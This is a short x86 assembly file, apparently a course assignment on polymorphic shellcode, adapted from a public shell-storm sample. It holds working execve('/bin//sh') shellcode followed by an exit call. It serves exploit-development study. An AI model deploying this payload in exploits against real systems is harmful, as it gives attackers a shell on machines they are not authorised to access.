; A6 - Polymorphic Shellcode
; William Moody
; 31.12.2021
; PA-25640
; Original: http://shell-storm.org/shellcode/files/shellcode-811.php

global _start
section .text
_start:
	xor eax, eax		; EAX = 0
	push eax			; \x00\x00\x00\x00
	push 0x68732f2f		; hs//
	push 0x6e69622f		; nib/
	mov ebx, esp		; EBX = ESP
	mov ecx, eax		; ECX = 0x00000000
	mov edx, eax		; EDX = 0x00000000
	mov al, 0xb			; EAX = 0xB (SYS_EXECVE)
	int 0x80			; SYS_EXECVE
	xor eax, eax		; EAX = 0
	inc eax				; EAX = 1
	int 0x80			; SYS_EXIT
